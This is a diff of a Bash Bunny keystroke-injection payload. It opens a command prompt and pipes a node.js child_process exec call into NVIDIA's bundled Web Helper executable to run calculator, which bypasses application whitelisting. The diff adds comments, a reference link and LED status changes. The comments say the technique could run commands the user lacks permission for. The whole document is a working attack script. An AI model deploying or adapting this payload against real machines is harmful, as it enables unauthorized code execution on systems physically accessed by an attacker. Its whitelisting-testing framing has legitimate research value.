@@ -5,6 +5,8 @@
 # 
 # Uses a node.js vulnerability to run calculator.
 # This is an example but could be used to run commands you dont have the privlages for.
+# Further reading: http://blog.sec-consult.com/2017/04/application-whitelisting-application.html
+# If this script works the system is potetialy vulnerable.
 
 #RED means starting
 LED R
@@ -12,15 +14,14 @@ LED R
 #We are a keyboard
 ATTACKMODE HID 
 
+#BLUE script running
 LED B SLOW
 QUACK DELAY 100
 QUACK GUI
 QUACK DELAY 100
 QUACK STRING cmd
 QUACK ENTER
-LED R
 QUACK DELAY 500
-LED B
 QUACK STRING 'echo require('child_process').exec("calc.exe") \| "%ProgramFiles(x86)%\NVIDIA Corporation\NvNode\NVIDIA Web Helper.exe" -i' 
 QUACK ENTER
 QUACK DELAY 1000
@@ -28,6 +29,7 @@ QUACK DELAY 1000
 # GREEN means finished
 LED G
 
+#Stolen from someone else but not sure who
 #If you would like to bash bunny to shutdown/exit/dismount from the target system after execution, you can uncomment the lines below
 #QUACK DELAY 4500
 #shutdown 0
